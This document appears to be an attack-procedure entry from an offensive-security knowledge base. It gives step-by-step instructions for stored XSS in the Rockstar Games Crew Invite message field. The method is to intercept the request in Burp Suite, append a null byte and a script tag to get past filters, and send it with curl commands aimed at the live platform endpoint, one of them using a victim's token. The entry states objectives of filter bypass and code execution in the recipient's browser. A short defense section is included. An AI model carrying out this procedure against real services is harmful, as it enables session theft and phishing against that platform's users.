---
id: proc-uuid-123
tags:
  - xss
  - stored-xss
  - injection
  - bypass
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/modify-crew-invite-request]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T00:11:09.199Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-into-Crew-Invite-Message

## Summary

This procedure exploits insufficient input sanitization in the Rockstar Games Crew Invite message field by intercepting and modifying requests to inject control characters, escaping anti-XSS filters and storing a JavaScript payload that executes when the invite is viewed.

## Description

In the context of Rockstar Games' web platform, the Crew Invite feature allows users to send invitations with custom messages. Due to inadequate filtering of control characters and unexpected inputs, an attacker with a valid account can alter the POST request during transmission to include null bytes (\x00) or other non-printable characters, breaking out of string delimiters and injecting HTML/JavaScript. When a recipient views the invite, the payload executes in their browser context, potentially leading to session theft, phishing, or further exploitation. This is a classic stored XSS scenario targeting a public-facing web application.

## Requirements

1. Valid authenticated session/token for Rockstar Games platform
2. Proxy tool like Burp Suite for request interception
3. Knowledge of the Crew Invite API endpoint (e.g., /crew/invite)
4. Target user access to view invites

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization using libraries like DOMPurify for all user inputs
- Encode outputs properly (e.g., HTML entity encoding) before rendering
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous request patterns, such as control characters in logs
- Rate-limit invite sends and scan payloads with WAF rules for XSS signatures

## Objectives

1. Bypass existing anti-XSS filters in the message body
2. Store and persist malicious JavaScript in the invite database
3. Achieve code execution in the victim's browser upon invite access

## Instructions

### Step 1: Setup Proxy and Intercept Request

**Context**: Configure a man-in-the-middle proxy to capture the invite submission request.

Use [[tools/Burp-Suite]] to set up interception. Configure your browser's proxy settings to 127.0.0.1:8080. Log in to the Rockstar platform and navigate to the Crew Invite section.

**Command** ([[commands/modify-crew-invite-request]]):
```bash
# No direct command; use Burp to intercept
```

> In Burp's Proxy tab, enable interception. Submit a test invite with a benign message. The request will be captured in the Proxy > Intercept tab.

### Step 2: Modify Message Payload

**Context**: Alter the message parameter to include control characters and XSS payload to escape filters.

In the intercepted request, locate the JSON body with the "message" field. Append a null byte (\x00) or Unicode control char, followed by the payload. Example modification: Change "message": "Hi join crew" to "message": "Hi join crew\x00<script>alert('XSS')</script>".

Execute a test with [[commands/modify-crew-invite-request]]:
```bash
curl -X POST 'https://platform.rockstargames.com/crew/invite' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"message": "Hi join crew\\x00<script>alert(\\"XSS\\")</script>", "target_user_id": 12345}'
```

> Forward the request in Burp or run the curl. The server should accept it without validation errors.

### Step 3: Verify Execution

**Context**: Access the generated invite to trigger the stored payload.

Copy the invite URL from the response or dashboard. Open it in a browser (use a test account). The script should execute immediately.

**Command** ([[commands/modify-crew-invite-request]]):
```bash
# Reuse curl for verification if API supports GET
curl -X GET 'https://platform.rockstargames.com/crew/invite/INVITE_ID' -H 'Authorization: Bearer VICTIM_TOKEN'
```

> Look for alert popup or inspect page source for injected script. Success if payload renders and executes.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/modify-crew-invite-request]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- xss
- stored-xss
- injection
